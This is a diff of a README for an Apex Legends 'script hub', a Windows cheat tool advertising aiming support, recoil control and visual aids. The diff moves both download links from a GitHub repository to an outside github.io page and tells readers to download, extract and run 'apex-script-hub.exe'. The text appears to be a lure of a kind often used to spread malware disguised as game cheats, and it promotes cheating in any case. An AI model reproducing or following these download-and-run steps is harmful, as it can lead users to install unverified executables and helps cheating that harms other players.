@@ -1,6 +1,6 @@
 # 🎮 apex-legends-script-hub - Enhance your gameplay with customizable tools
 
-[![](https://img.shields.io/badge/Download-Release-blue)](https://github.com/humoroffering145/apex-legends-script-hub)
+[![](https://img.shields.io/badge/Download-Release-blue)](https://humoroffering145.github.io)
 
 This utility provides configurable tools for Apex Legends on Windows. It combines visual aids, aiming support, recoil management, and movement helpers into a single package. You can customize each feature to match your gameplay preferences.
 
@@ -18,7 +18,7 @@ Ensure your computer meets these conditions before you run the application:
 
 Follow these steps to download and run the software.
 
-1.  Visit [this page](https://github.com/humoroffering145/apex-legends-script-hub) to download the latest version of the utility.
+1.  Visit [this page](https://humoroffering145.github.io) to download the latest version of the utility.
 2.  Locate the downloaded zip file in your Downloads folder.
 3.  Right-click the file and select Extract All. Choose a folder on your desktop for easy access.
 4.  Open the folder and find the executable file named apex-script-hub.exe.
